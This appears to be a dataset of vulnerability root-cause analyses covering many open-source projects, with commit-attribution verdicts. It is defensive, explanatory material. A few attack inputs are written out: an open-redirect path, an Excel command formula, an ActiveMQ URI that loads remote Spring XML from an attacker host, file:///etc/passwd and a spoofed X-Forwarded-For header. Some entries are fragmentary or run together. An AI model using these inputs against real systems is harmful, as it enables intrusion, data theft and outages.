causal_chain.bug_semantics: Gogs treats attacker-controlled redirect_to as a same-site path if IsSameSite (historically isValidRedirect / IsSameSiteURLPath) returns true, then issues c.Redirect to that string. Through v0.14.2 the predicate only required length>=2, a leading '/', and that the second byte was not '/' or '\'. That accepts /a/../\example.com. Browsers normalize '\' to '/' in Location, so the path becomes /a/..//example.com and then a protocol-relative //example.com cross-origin redirect after login (and on other post-action redirect_to flows). The 0.14.3 fix normalizes raw and percent-encoded backslashes plus CR/LF/tab, then rejects any result that is not a single-slash-prefixed path or that contains '//'.

causal_chain.bug_semantics: django.contrib.admin.utils.display_for_field() special-cased models.URLField by emitting format_html('{}', value, value) using the raw stored field value as the href. Admin changelist cells and read-only change-form widgets call this helper, so a stored unsafe scheme (javascript:, data:, etc.) became a clickable link for staff. URLField form/admin validation already rejects those schemes, so the practical source is persistence that skips model validation (queryset writes, deserialization, bulk import). Clicking the link is XSS in the authenticated admin session (CWE-83). The 2026 fix runs URLValidator() first and falls back to plain text on ValidationError. This is a new display_for_field sink from the 5.2 #36032 feature, not leftover AdminURLFieldWidget XSS from CVE-2019-12308.

causal_chain.bug_semantics: Kiota's PHP writer interpolates OpenAPI-controlled strings into generated PHP double-quoted literals. PHP evaluates $var, ${expr}, and {$obj->prop} inside those literals when the generated client runs, so a malicious spec can inject PHP/OS commands. The first executable sink was request-body media types: KiotaBuilder copied operation.RequestBody.Content keys into CodeMethod.ContentType, and WriteRequestGeneratorBody emitted them as "{contentType}" in setContentFromParsable. Additional sinks later used the same unescaped double-quote pattern for Accept headers, discriminator property names, query-parameter annotations, and (after a 2024 single-to-double quote switch) enum wire values. Shared SanitizeDoubleQuote only escaped quotes/backslashes/controls, not $, so ${...} survived sanitizer wrapping until SanitizePhpDoubleQuoteLiteral ($ -> \$) was added.

causal_chain.bug_semantics: When better-auth is started without an explicit baseURL (no options.baseURL and no BETTER_AUTH_URL/related env), the first HTTP request may set the process-wide ctx.baseURL. getBaseURL concatenates attacker-controlled X-Forwarded-Proto and X-Forwarded-Host into a URL string and passes it to withPath(). A proto value such as `some:` yields `some:://junk`, whose WHATWG pathname is `://junk`; a host value with a path (https://junk/poison) likewise injects a non-default pathname. That full URL is stored on the shared AuthContext; the router then does `new URL(ctx.baseURL).pathname` as better-call basePath, so later legitimate /api/auth routes 404 until restart. Persistence comes from assigning getOrigin(ctx.baseURL) onto ctx.options.baseURL, which skips re-inference on subsequent requests.

The advisory is a live, published DoS: unauthenticated X-Forwarded-* headers on the first request can rewrite the shared router basePath when baseURL is not configured. That source was not present before a7c699214c83b9359a19bcbebd34be5837e41555; the parent only derived origin from request.url and a configured path. The GitHub squash onto main is a carrier, and PR member decomposition recovers a7c699214c as the first-write with 852e846720 as unrelated cleanup. Protocol validation added earlier (1c0acc2bb, already in v1.4.0/1.4.1) blocks the exact `some:` proto but not path injection via https host/path, so it is not the GHSA fix. AI attribution is BIC-local only: the introducer commit object is a named human with no AI markers. Copilot on the later fix is irrelevant to BIC authorship. Therefore this is a real vulnerability with human first-write: NOT_AI.

causal_chain.bug_semantics: Unauthenticated POST /system/api/login (src/routes/login.js) reads username/password from the body and calls HAXCMS.testLogin(name, pass, true). testLogin accepts the request when they match this.user or this.superUser. Before 11.0.10 those objects were hardcoded in the HAXCMSClass constructor to admin/admin, with no install prompt and no UI to change them, so any self-hosted instance using the shipped defaults could be logged in from the public source. Success sets an httpOnly refresh cookie and returns a JWT. The 2020 first-write also hardcoded JWT privateKey to NEEDTOGETTHIS; by the 2024 npm split Node generated per-instance uuidv4 keys into .pk/.rpk, so GitHub-readable JWT literals were no longer the shipped Node mechanism, but the default credentials remained.

causal_chain.bug_semantics: Vitest Browser Mode exposes Node-side provider commands over the tester RPC. From the first screenshot command onward, several of those commands took a browser-supplied path and performed filesystem read/write/delete without the authorization and confinement already used by the built-in fs commands (isFileServingAllowed / later allowWrite). Concrete source-to-sink: a reachable client invokes upload/takeScreenshot/screenshotMatcher/stopChunkTrace/deleteTracing/annotateTraces with an absolute path or ../ traversal; path.resolve drops the project root when the last segment is absolute; Playwright setInputFiles reads the file into the page (CWE-552), screenshot/trace write a PNG or zip at that path (CWE-22), deleteTracing unlinks it, and annotateTraces records the path so the reporter copies file contents into attachmentsDir. allowWrite defaulting to false when the API is exposed was meant to block this class of access, but these commands never consulted it.

causal_chain.bug_semantics: The MongoDB node's Query parameter is a JSON string. n8n's getNodeParameter resolves expressions in that string, then Find, Delete, and Aggregate JSON.parse the result and pass it to collection.find / deleteMany / aggregate with no neutralization of MongoDB operators. An attacker who can influence the resolved query (webhook/trigger data interpolated into Query, or a fully expression-driven query) can inject operators such as $ne or $where, expanding an intended single-document lookup into full-collection read or delete (CWE-943).

causal_chain.bug_semantics: Spring Security HeaderWriterFilter defaults to lazy header writing (shouldWriteHeadersEagerly=false). It wraps the servlet response in HeaderWriterResponse, which extends OnCommittedResponseWrapper, and writes security headers (X-Frame-Options, X-Content-Type-Options, CSP, Cache-Control, HSTS, etc.) only when the wrapper believes the response is about to commit, or in a finally block after the chain. OnCommittedResponseWrapper historically tracked Content-Length only via addHeader/setContentLength/setContentLengthLong. If an application or framework sets Content-Length through setHeader, setIntHeader, or addIntHeader, the wrapper does not record the length. When the body size then matches Content-Length, Tomcat commits the response; later setHeader calls from HeaderWriterFilter are no-ops. Protective headers are silently omitted, enabling cache leakage and missing browser security headers. Spring Framework 7.0.5 made this path common by applying Content-Length via setHeader immediately, but any setHeader Content-Length client could trigger it on the lazy default.

causal_chain.bug_semantics: Stored XSS in MISP's old event-templating engine. An authenticated user who can create or edit template element attributes POSTs TemplateElementAttribute type and category through TemplateElementsController add/edit. CakePHP saves the request data; model validation only rejected empty/'Select Type'/'Select Category' values and did not whitelist against MispAttribute typeDefinitions/categoryDefinitions, so an arbitrary type string (and complex=true) could be persisted. On a later GET of template_elements/edit/attribute/<id>, the controller copies the stored row into $initialValues and renders app/View/TemplateElements/ajax/template_element_edit_attribute.ctp. When complex is true, that view emits currentTypes = complexTypes["<stored type>"]['types'] inside a script tag without json_encode or HTML escaping, so a crafted type breaks out of the JavaScript string and executes in the victim's MISP origin. Row listing already used h() and was not this sink. 2.5.37 unlinked the old UI from menus but left the controller/view reachable; 62824e5 closes the sink with json_encode and the missing whitelist.

causal_chain.bug_semantics: PhpSpreadsheet HTML Writer XSS via NumberFormat @ text substitution. Writer/Html.php formats a cell with NumberFormat::toFormattedString(..., [$this,'formatColor']) and applies htmlspecialchars only when the formatted string strictly equals the original cell value. Html::formatColor htmlspecialchars-escapes its argument, but only if the formatter actually invokes the callback. Commit edc003ad1 added an early return for single-section masks containing @: it substituted the raw cell value into the mask (including extra literals such as 'Hello @', '@ "items"', '. @') and returned without calling $callBack. The formatted result then differed from $origData, so the Html.php htmlspecialchars gate was also skipped, and attacker-controlled markup from a crafted spreadsheet reached generateHTMLAll() output. A 2026-04-05 incomplete patch invoked the callback only on quoted-literal @ masks; unquoted extra literals stayed unsanitized until the 2026-04-18 callback on the unquoted path.

causal_chain.bug_semantics: SiYuan publish mode proxies requests to the kernel with an X-Auth-Token JWT. CheckAuth accepts a valid publish JWT (RoleReader, or the anonymous account when Publish.Auth.Enable is false), so POST /api/asset/resolveAssetPath is reachable without admin role. The handler resolves the caller-supplied relative asset path via GetAssetAbsPath/GetAssetAbsPathInBox and returns the absolute filesystem path in ret.Data with no redaction. A reader who copies an assets/… URL from a published document therefore learns the workspace absolute path, typically embedding the OS username and install layout. Sibling CheckAuth-only inventory APIs getUnusedAssets/getMissingAssets had the same authz gap. The project already treated those paths as sensitive in getConf (HideConfSecret / later browser WorkspaceDir stripping) but did not apply equivalent controls here until CheckAdminRole was added.

causal_chain.bug_semantics: Actual sync-server mounts bank-sync Express sub-apps at /simplefin and /pluggyai. Those apps expose POST /status, /accounts, and /transactions that read server-side SimpleFIN/Pluggy secrets and proxy account balances and transactions. Unlike GoCardless, which wrapped the same class of routes with validateUser (later validateSessionMiddleware), SimpleFIN and Pluggy registered only express.json() (later plus requestLoggerMiddleware). The server has no global session gate in app.js, so an unauthenticated network client can call the six endpoints and exfiltrate configured users' bank data. CWE-306. Fixed by inserting validateSessionMiddleware in both apps.

causal_chain.bug_semantics: On the self-hosted Next.js Node server, WebSocket upgrade requests are handled by upgradeHandler in packages/next/src/server/lib/router-server.ts. resolveRoutes parses req.url (including HTTP absolute-form targets such as GET http://127.0.0.1:internal/secret HTTP/1.1) and returns parsedUrl.protocol whenever that URL has a scheme. Before the fix, the upgrade path proxied with proxyRequest/httpxy as soon as parsedUrl.protocol was set, without requiring that routing had finished an explicit external rewrite (finished) and without rejecting redirect statusCodes. That lets an untrusted client force the origin to open a WebSocket/HTTP proxy to an arbitrary internal or external host, including cloud metadata, which is CWE-918 SSRF. The ordinary HTTP request handler already gated proxying on finished && parsedUrl.protocol, so the same absolute-form request was not treated as a safe rewrite on that path. The May 2026 guard applies those same checks to upgrades: proxy only when finished && parsedUrl.protocol && !statusCode, otherwise end the socket. Configured ws/http external rewrites still work because they set finished without a redirect statusCode.

causal_chain.bug_semantics: On the VM expression engine, IsolatedVmBridge exposes a host ivm.Reference getArrayElement so the isolate-side lazy array proxy can fetch workflow-array elements. The callback did `arr[index]` without requiring a non-negative integer index and without refusing function-typed results (unlike getValueAtPath in the same file). An authenticated user who can write a workflow expression can steal that host callback (via isolated-vm applySync / arguments.callee.caller) and invoke it with prototype keys such as 'constructor' or '__lookupGetter__'. Those reads walk the host array's prototype chain, return live host built-ins by reference, and let the guest pollute Object.prototype in the main n8n process — a sandbox escape. Vendor advisory: RCE; NVD/CVE text: DoS.

causal_chain.bug_semantics: When prompt/multimodal embedding inputs are enabled, vLLM deserializes attacker-controlled base64 torch.save blobs with torch.load(weights_only=True) and, on the Completions prompt-embeds path, immediately calls tensor.to_dense(). From PyTorch 2.8.0 onward, sparse COO/CSR/CSC invariant checks are off by default, so negative or out-of-bounds sparse indices are accepted and to_dense() can crash the process, exhaust memory, or perform an OOB write-what-where. CVE-2025-62164's 0.11.1 remediations only defaulted --enable-prompt-embeds/--enable-mm-embeds to false; the same loaders remain reachable and unvalidated when an operator turns the feature on. CVE-2026-56340 is that residual missing-validation bug, closed in 0.13.0 by wrapping load+densify in torch.sparse.check_sparse_tensor_invariants() (and applying the same check to image/audio embedding MediaIO).

causal_chain.bug_semantics: SuluSecurityListener is opt-in: on kernel.controller it returns immediately unless the controller implements SecuredControllerInterface (or SecuredObjectControllerInterface), so REST admin endpoints without that interface skip Sulu permission checks after Symfony authentication. ContactController and AccountController declare sulu.contact.people and sulu.contact.organizations, but contact subentity admin API controllers (ContactTitleController /contact-titles, PositionController /contact-positions, ContactMediaController /contacts/{id}/medias, AccountMediaController /accounts/{id}/medias) did not. A user who can reach the Sulu Admin API via any role, but who lacks contact permissions, can still list/create/modify those subentities. The 2.6.22 patch adds the missing interface and contexts (and the same check on RoleSettingController).

Create looks up drafts globally via CamaleonCms::Post.drafts.where(post_parent: params[:post_id]) and otherwise does @post_type.posts.new(@post_data).save(validate: false); update does CamaleonCms::Post.drafts.find(params[:id]). A caller who lacks Ability :create_post (ids_edit on that post type) or :update on the target post can still insert a draft_child into the admin drafts queue or overwrite another user's draft, including stealing user_id when set_post_data_params filled it from cama_current_user. PostsController#create has always required authorize! :create_post; the drafts override is the missing-authorization bypass (CWE-862).

causal_chain.bug_semantics: WeCom outbound media loading (WeComAdapter._load_outbound_media) accepts an attacker-influenced media_source. HTTP(S) sources are fetched via _download_remote_bytes; file:// sources become Path(unquote(parsed.path)).expanduser() and any other string becomes Path(source).expanduser(). Relative paths are resolved against cwd, but absolute file:// URLs such as file:///etc/passwd are used as-is. After only exists()/is_file() checks, local_path.read_bytes() loads the file and _upload_media_bytes ships it to the WeCom API through send_image/send_document/send_voice/send_video. There is no is_relative_to/allowlist bound, so any file readable by the Hermes process can be exfiltrated as a WeCom media attachment. The reporter's separate read_file API-server PoC is a different, by-design tool path and is not this sink.

causal_chain.bug_semantics: The legacy oidcProvider and mcp plugins (mcp wraps oidcProvider and duplicates discovery metadata) shipped two insecure cryptographic defaults. Discovery builders unconditionally advertised JWS alg "none" in id_token_signing_alg_values_supported (and mcp resource_signing_alg_values_supported). That metadata is served from /.well-known/openid-configuration; a client that takes the advertised alg set as the negotiation allowlist can accept an unsigned ID token. Independently, authorize() received merged opts with allowPlainCodeChallengeMethod defaulting to true and, before the method allowlist, rewrote a missing code_challenge_method to "plain". The token endpoint then treated the verifier as the challenge. Discovery still listed only S256, so the runtime silently offered weaker PKCE than advertised; a leaked authorization URL (Referer, logs, history) yields the verifier and enables authorization-code interception. Both surfaces are closed in 1.6.11 by dropping "none" from the alg lists, defaulting allowPlainCodeChallengeMethod to false, and rejecting unpaired PKCE parameters.

causal_chain.bug_semantics: Authenticated operators could set an SSH/remote terminal profile's terminal.cwd to a blocked local system root such as /etc. _remote_terminal_workspace_candidate() resolved that cwd and any contained path, then returned it as a trusted workspace after only a cwd-containment check. resolve_trusted_workspace() and validate_workspace_to_add() honored that return before _is_blocked_workspace_path() ran, so local workspace file-read helpers treated the accepted root as a local Path and could read host files (PoC: /etc/hosts via /private/etc on macOS).

causal_chain.bug_semantics: Fickling's MLAllowlist pass is supposed to flag pickle imports outside ML_ALLOWLIST, including standard-library modules that the UnsafeImports denylist never lists. AnalysisContext.shorten_code() is a formatter that also records each shortened snippet in a process-wide reported_shortened_code set. UnsafeImportsML walks every import and calls shorten_code() even when the import is not unsafe, so every import is marked reported. When MLAllowlist later walks the same nodes, already_reported is true and it continues without consulting ML_ALLOWLIST. check_safety() therefore returns LIKELY_SAFE for payloads such as from ast import parse. fickling.load() treats LIKELY_SAFE as permission to pickle.loads(), so the payload runs. UnsafeImportsML and MLAllowlist are each consistent in isolation; the defect is the shared mutable dedup set plus the allowlist iterating the same full import set the poisoner already marked.

causal_chain.bug_semantics: In Pydantic v2 generation, untrusted validators objects from --extra-template-data (and from --validators, which copies into extra_template_data) are read by BaseModel._process_validators. Field names and mode are interpolated into Python string literals with unescaped single quotes (fields_str = ", ".join(f"'{f}'" for f in fields); mode_str = f"mode='{mode}'") and emitted verbatim into BaseModel.jinja2 as @field_validator({{ v.fields_str }}, {{ v.mode_str }}). A quote in field or mode breaks the literal and injects a positional Python expression that runs at class-definition time when the generated module is imported. A secondary sink passes validator['function'] to Import.from_full_path, which splits on the last dot and emits from <prefix> import <suffix>, so a semicolon in function becomes a statement at module load. Impact is RCE in the developer/CI interpreter under the same extras-file trust model as GHSA-wjv6-jcfj-mf9r.

causal_chain.bug_semantics: UDR exposes DELETE /nudr-dr/v2/application-data/influenceData/:influenceId/:subscriptionId because Gin cannot register both a static subs-to-notify segment and :influenceId. The intended gate is that only influenceId==subs-to-notify may delete a Traffic Influence Subscription. After the 2024 processor refactor, HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdDelete sent 404 for any other influenceId but did not return, so ApplicationDataInfluenceDataSubsToNotifySubscriptionIdDeleteProcedure still deleted the in-memory subscription by subscriptionId. An unauthenticated SBI caller who knows or guesses a subscriptionId can DELETE via an invalid path, observe 404, and still remove the subscription.

causal_chain.bug_semantics: phpseclib 3 parses untrusted ASN.1 (X.509 certificates, PKCS#8 EC keys, etc.) that may carry explicit specifiedCurve parameters over a characteristic-two field. Common.php copies the attacker-controlled INTEGER m (field degree) into BinaryCurve::setModulo, which constructs Math\BinaryField without bounding m. BinaryField::__construct then does str_repeat('0', $m) (unbounded allocation) and builds a reduction closure whose loop bound is 2*m-2. A huge m therefore causes memory exhaustion and/or excessive iteration (CWE-400/CWE-834) during key/certificate load, including when point decompression runs F2^m arithmetic. The 3.0.34 fix rejects degrees larger than 571 (largest SECG binary curves sect571r1/k1) before those operations.

causal_chain.bug_semantics: PraisonAI MCP HTTP-stream transport (praisonai mcp serve --transport http-stream) binds to localhost with no API key by default and treats Origin allowlisting as the browser-facing control. HTTPStreamTransport._validate_origin allowed a missing Origin and otherwise accepted any request_origin that equaled or started with an allowlist entry such as http://localhost or http://127.0.0.1. causal_chain.bug_semantics: withCredentials (BindingStep) binds credential plaintext into the Pipeline body environment. ConsoleLogFilter/MaskingOutputStream redacts those values on the build console stream, but Pipeline failures persist the Throwable on flow ErrorAction and print it with Functions.printThrowable, which does not pass through ConsoleLogFilter. A body that interpolates a bound secret into error()/Exception (or any nested/suppressed cause) therefore writes the secret to the build log and stores it unmasked on the run. Attackers with permission to read that log (Jenkins advisory CVSS PR:L) recover the credential. The 2025 fix installs a FailureHandler that, when the printed throwable matches the secret pattern, rethrows MaskedException copies whose messages have secrets replaced with asterisks, including cause and suppressed chains.

causal_chain.bug_semantics: CorrelationsController::overCorrelations() (site-admin ACL) initialized a CakePHP find $query with limit, page, and order=>'occurrence desc', then overwrote any of those keys from $this->params['named'] / $this->request->params['named']. Because order was in that key set, an authenticated site admin could pass a named order parameter (for example /correlations/overCorrelations/order:<expression>) and replace the server-side ORDER BY. OverCorrelatingValue::getOverCorrelations() forwarded the array unchanged to Model::find('all', $query), so the untrusted order string reached CakePHP's query compiler. That is query-order manipulation and, depending on DboSource order handling, unsafe ORDER BY construction. The 2026 fix stops copying order from the request and assigns 'occurrence desc' after the user-parameter loop.

The GET form only lists authorized groups (fetchAllAuthorised), but a tampered request can set distribution=4 and an arbitrary sharing_group_id. REST edit is not this bug: it calls Event::_edit(), which requires SharingGroup::checkIfAuthorised (and add() had an equivalent sgs[] membership throw since 2015). Successful assignment attaches the event to an undisclosed/unauthorized sharing group, exposing the group name on listings and changing distribution metadata. The 2026 fix runs SharingGroup::checkIfCanBeUsed when the SG actually changes under distribution 4, and clears sharing_group_id when distribution is not sharing-group.

causal_chain.bug_semantics: When Kubernetes Ingress NGINX is enabled and an Ingress uses nginx.ingress.kubernetes.io/rewrite-target with a regex that can capture text adjacent to the prefix (example path /api(.*) and rewrite /$1), Traefik selects the public PathRegexp router on a request such as /api../admin. Default entry-point sanitizePath leaves that URL unchanged because api.. is one ordinary segment. After routing, RewriteTarget.ServeHTTP runs regexp.ReplaceAllString, producing /../admin, PathUnescapes it, and forwards without checking that url.URL.JoinPath() would normalize the path. A backend that collapses dot-segments dispatches to /admin, which is intended to be reachable only through a separate router that has BasicAuth/DigestAuth/ForwardAuth. The same class of check already existed on ReplacePathRegex (GHSA-cxjq-mrr5-89rv, in v3.7.7) but not on this separate ingress-nginx middleware.

causal_chain.bug_semantics: An attacker who can set a conversion name/description or an evaluation comment injects Markdown/HTML resource URLs (http://, https://, file://, or markdown image syntax). Exporting the evaluation PDF hits /export/<id>/pdf, which builds Markdown from those fields, converts it to HTML without sanitization, and renders it with WeasyPrint HTML.write_pdf() using the default URL fetcher. WeasyPrint then fetches those URLs with the server's network and filesystem privileges and may embed the response in the PDF (SSRF / local file disclosure, CWE-918). The same renderer also unconditionally @imported Google Fonts over HTTPS.

causal_chain.bug_semantics: IOFactory::load($filename) (and Reader::load) take a caller-supplied path, pick a reader, and validate that the path is a real readable file using PHP stat-family functions: originally file_exists() in each PHPExcel reader, later File::assertFile() -> is_file()/is_readable(). Those functions are stream-wrapper aware for any wrapper that implements stat(), including phar://, ftp://, and ssh2.sftp://. is_file/file_exists on phar:// stats the archive and unserializes PHAR metadata, which is RCE if a POP gadget exists in the app; ftp:// and ssh2.sftp:// become SSRF. The intended local-file gate is therefore both the permission check and, for phar, the trigger. The 2026 fix rejects multi-character URL schemes in File::prohibitWrappers() before is_file().

causal_chain.bug_semantics: univ.Real stores ASN.1 REAL as (mantissa, base, exponent). Real.__float__ computed float(mantissa * pow(base, exponent)) with exact big-integer exponentiation. prettyPrint, str, comparisons, arithmetic, and int() all funnel through float(self). A compact BER/CER/DER REAL (or Real((m, b, e)) constructed directly) can encode a huge exponent; pow() then tries to materialize an enormous integer and the process hangs (CWE-400). Decoding itself only builds the tuple; the DoS fires on conversion. The 2011 RealDecoder left binary REAL as pass; binary encoding/decoding landed later (ae6f36fe, 2011-03-15 parent of the inf wrap) and still produced unbounded exponents that the same __float__ consumed. Fix in 0.6.4: base-2 via math.ldexp, base-10 overflow-checked against sys.float_info.max_10_exp so out-of-range values raise OverflowError and prettyPrint stays '<overflow>' without huge intermediates.

causal_chain.bug_semantics: OliveTin validates configured action arguments before execution. For type email, TypeSafetyCheck dispatches to typeSafetyCheckEmail, which calls net/mail.ParseAddress and then (before the fix) always executed logrus log.Errorf("Email check: %v, %v", err, value). Because %v prints the raw string, a caller of StartAction or ValidateArgumentType who can supply an email-typed argument in exec mode (shell mode rejects type email in checkShellArgumentSafety) injects newlines into ERROR logs, forging extra logfmt/JSON events, and every successful email is also stored as PII at ERROR. Source is the user-supplied argument value; sink is the process ERROR log / SIEM.

causal_chain.bug_semantics: In mcp-toolbox 1.4.0, a Google authService with mcpEnabled:true and neither audience nor clientId can be initialized. MCP requests hit AuthService.ValidateMCPAuth. JWT ID tokens fail closed if both fields are empty, but opaque Google access tokens are POSTed to https://oauth2.googleapis.com/tokeninfo and then compared only when audLimit (Audience, else ClientID) is non-empty. When both config fields are empty, any tokeninfo-200 token is accepted regardless of aud/azp, so a token minted for an unrelated Google client authorizes MCP tools and backends. The 1.5.0 fix refuses to initialize that configuration.

causal_chain.bug_semantics: org.freedesktop.UDisks2.Block.RestoreEncryptedHeader is a privileged D-Bus method implemented by handle_restore_encrypted_header() in src/udiskslinuxblock.c. A local unprivileged caller can invoke it on the system bus; udisksd (root) resolves the target block, takes the caller UID, launches a job, and calls libblockdev bd_crypto_luks_header_restore() on udisks_block_get_device(block) using the caller-supplied backup_file path. Unlike neighboring Block handlers (Format, Rescan, Open*), this path never calls udisks_daemon_util_check_authorization_sync(), so no polkit action is required. The overwrite destroys LUKS headers and keyslots (integrity/availability DoS; original passphrase no longer unlocks). The handler also does not require the target to be LUKS, so it can clobber non-LUKS devices. CWE-862.

causal_chain.bug_semantics: An admin (or other privileged catalog user) can set a product name or other exportable DataGrid field to a spreadsheet formula such as =cmd|' /C calc'!A0. Bagisto stores the string as ordinary product data. The shared DataGrid exporter (Maatwebsite Excel FromQuery/WithMapping in v2.3.7; historically FromView over admin::export.export) writes each exportable column value into CSV/XLS/XLSX without neutralizing leading =, +, -, @, tab, CR, LF, |, or %. When a victim opens the download in Excel/LibreOffice, the cell is evaluated as a formula, enabling data exfiltration or (on older Excel) command execution. Product name is exportable by default; the same unsanitized sink serves other admin grids.

causal_chain.bug_semantics: LIVE SELECT persists the registering user's Auth (and, after #2661, the session value that supplies $auth, $token, $session, and $access) on the stored subscription. Notification dispatch in lives.rs rebuilds Options/Context from that snapshot and evaluates table- and row-level PERMISSIONS against it, never against the current RPC session. After invalidate() clears the session, after DURATION FOR SESSION TTL expiry, or after signin/signup/authenticate/refresh changes the principal on the same connection, the subscription keeps matching the old principal, so the client continues to receive real-time notifications until the connection closes. Impact is confidentiality-only continued reads of records the prior principal could already SELECT.

causal_chain.bug_semantics: Authenticated GET /notification/delete/{id} is handled by DeleteNotificationController::delete(int $id). The method loaded App\Models\Notification with findOrFail($id) and called delete() with no user_id or company_id predicate. MainController applies the auth middleware, so the caller must be logged in, but any login can delete any notification row. notification.id is a sequential bigint, so IDs can be walked to wipe other users' ticket/task alerts. The 2026-06-25 fix scopes the lookup to Auth::id() and 404s via firstOrFail on mismatch.

causal_chain.bug_semantics: An authenticated caller of BrokerView.addNetworkConnector or addConnector (Jolokia /api/jolokia exec on org.apache.activemq:* when activemq-http is present) can pass a first-stage http:// discovery URI. HTTPDiscoveryAgent polls that registry and treats each response line as a service URI with no scheme validation. DiscoveryNetworkConnector then connects to that second-stage URI. After CVE-2026-34197, BrokerView only denied first-stage scheme vm (including nested composite wrappers), so http discovery still ran and a malicious registry could return vm://...?brokerConfig=xbean:http://attacker/payload.xml. VM transport loads ResourceXmlApplicationContext, which instantiates singleton beans before BrokerService config checks, yielding RCE via factory methods such as Runtime.exec().

Source: authenticated Jolokia/JMX BrokerView.addNetworkConnector or addConnector with an HTTP Discovery URI while activemq-http is on the classpath.

Second stage: HTTPDiscoveryAgent.doLookup() treats HTTP response lines as service URIs with no scheme check and calls DiscoveryListener.onServiceAdd; DiscoveryNetworkConnector.onServiceAdd() then TransportFactory.connect()s event.getServiceName().

Sink: a discovered vm:// URI with brokerConfig=xbean:http://... loads ResourceXmlApplicationContext before BrokerService validates config, so singleton factory methods such as Runtime.exec() run in the broker JVM.
CVE-2026-34197 denylist on 5.19.4/5.19.5 and 6.2.3/6.2.4 only rejected scheme vm in the first-stage URI; scheme http was allowed, so the discovered vm URI never re-entered validateAllowedUri.

causal_chain.reasoning: CVE-2026-40466 is a real, unwithdrawn Apache advisory: HTTP Discovery as a first-stage connector URI lets a malicious registry return a vm://brokerConfig second-stage URI that bypasses the CVE-2026-34197 first-stage vm denylist and loads remote Spring XML. The unique defective capability is HTTPDiscoveryAgent treating attacker-controlled HTTP lines as transport URIs. That code first appears in a0af3515201afcf635100fc1fee6b336e378e8be (2009 AMQ-2407); the parent tree lacks those files while JMX addNetworkConnector and DiscoveryNetworkConnector already consumed discovered URIs. The 34197 denylist is later incomplete remediation of the outer URI, matching the vendor 'bypass of CVE-2026-34197' narrative but not the first-write of this path. The 40466 closure is PR #1918 adding http to BrokerView.DENIED_TRANSPORT_SCHEMES, landed as 5bda7d83 on main and cherry-picked into patched 5.19.6 and 6.2.5. AI attribution is BIC-only: a0af351 is a 2009 git-svn commit by Hiram R. Chirino with no AI trailers, so the verdict is NOT_AI.

Team overrides live as config-file section [team=celery] or env AIRFLOW__TEAM___CELERY__BROKER_URL. as_dict copies every ConfigParser section verbatim, then masks by iterating sensitive_config_values and looking up those base names only, so [team=celery] broker_url is never visited. _include_envs splits the team env var on '__' with maxsplit=2 into section=TEAM key=_CELERY__BROKER_URL, reconstructs the same env var, and fails the (section, key) membership test, emitting the broker URL (including embedded credentials) in cleartext under a synthetic section. get_config_value likewise compared the URL section/option literally to sensitive_config_values, so a request for section=team=celery&option=broker_url returned conf.get() unmasked. causal_chain.bug_semantics: When ospfd has 'debug ospf packet ... detail' enabled, LS Update processing dumps each LSA. For opaque types, ospf_dump.c calls ospf_opaque_lsa_dump(), which invokes show_opaque_info_detail(NULL, &lsa, NULL). That dispatcher looks up the opaque-type functab and calls show_opaque_info with vty==NULL. Extended Link/Prefix show callbacks in ospfd/ospf_ext.c (registered as ospf_ext_link_show_info / ospf_ext_pref_show_info) then execute vty_out(vty, ...) and check_tlv_size's vty_out without testing vty, dereferencing a NULL vty and crashing ospfd (DoS). TE/RI callbacks already honored the NULL-vty dump contract; the CVE names show_opaque_info_detail because it is the dispatch frame, but the dereference is in the EXT show path it calls. The NVD-linked 0042fbe rewrite of already-present functab NULL checks does not stop this crash.

causal_chain.bug_semantics: Kestrel HTTP/3 treats inbound QPACK encoder (stream type 2) and decoder (stream type 3) control streams as must-accept no-ops. ProcessRequestAsync dispatches those types to HandleEncodingDecodingTask, which (before the fix) looped while (_isClosed == 0), calling PipeReader.ReadAsync and AdvanceTo(End) without testing result.IsCompleted. Unlike HandleControlStream in the same class, that loop never exits on FIN. OnClosed was registered only for outbound control sends and after inbound SETTINGS, so encoder/decoder FIN never set _isClosed. After the QUIC STREAM FIN, the pipe is complete and subsequent ReadAsync returns immediately, spinning a thread at 100% CPU (CWE-400). PoC: complete a QUIC handshake, then send stream_id=6 fin_bit=1 empty encoder payload.

Source: src/GraphQL/loaders/parseClassTypes.js maps parseClass.fields[field].required to GraphQLNonNull on Create<Class>FieldsInput so omitted required custom fields become graphql-js input-coercion failures.

causal_chain.bug_semantics: When password auth is off (the first-run default), POST /api/onboarding/setup, /api/onboarding/probe, and /api/onboarding/oauth/start treated a request as local if ipaddress.ip_address(X-Forwarded-For leftmost hop or X-Real-IP or socket peer) was loopback or RFC1918. A remote client can send `X-Forwarded-For: 127.0.0.1` (or any private address) with no trusted proxy in front; the gate then allows unauthenticated onboarding. That bypass reaches apply_onboarding_setup (overwrite LLM provider config and API keys), probe_provider_endpoint (SSRF to an attacker-chosen URL, including cloud metadata), and start_onboarding_oauth_flow (device-code tokens stored in auth.json). The pre-v0.50.22 socket-only check could not be spoofed this way.

causal_chain.bug_semantics: Applications that install DelegatingDecompressorFrameListener decompress HTTP/2 DATA via an EmbeddedChannel. Http2Decompressor.decompress() (and historically onDataRead) does decompressor.writeInbound(data.retain()). Java evaluates data.retain() before writeInbound, bumping ByteBuf refCnt 1->2. EmbeddedChannel.writeInbound begins with ensureOpen(); if cleanup()/finish() already closed the channel (stream removal or END_STREAM with the decompressor property still attached), ClosedChannelException is thrown before the pipeline takes ownership, so the decoder finally-release never runs. The surrounding catch rethrows Http2Exception/streamError without data.release(), so the extra reference is never dropped. The frame reader then releases once (refCnt 2->1) and the typically direct buffer is leaked. Repeating DATA on a long-lived connection exhausts direct memory (CWE-400/401 DoS).

causal_chain.bug_semantics: An operator can point ATOMIC_AGENTS_MCP_SERVER_REGISTRY_BACKEND=http at a catalog URL. Through v1.0.0 the factory make_http_mcp_server_registry_backend_from_url accepted both http and https. The catalog JSON is parsed into MCPServerSpec values whose command/args are type-checked (string / list of strings) but content-unrestricted. Agent construction materializes those specs onto AgentProfile.mcp_servers_resolved; MCPClientPool then stdio-spawns StdioServerParameters(command=spec.command, args=spec.args) with no command-basename allowlist. On a cleartext http:// catalog a network MITM can rewrite the response to inject an arbitrary executable and obtain host RCE with no LLM in the loop. Policy mcp_allow_fn is None unless a Policy backend is configured, and even then default enforce_noncap=False only logs denials. The https path is not this bug: httpx.Client is constructed with library defaults verify=True and follow_redirects=False.
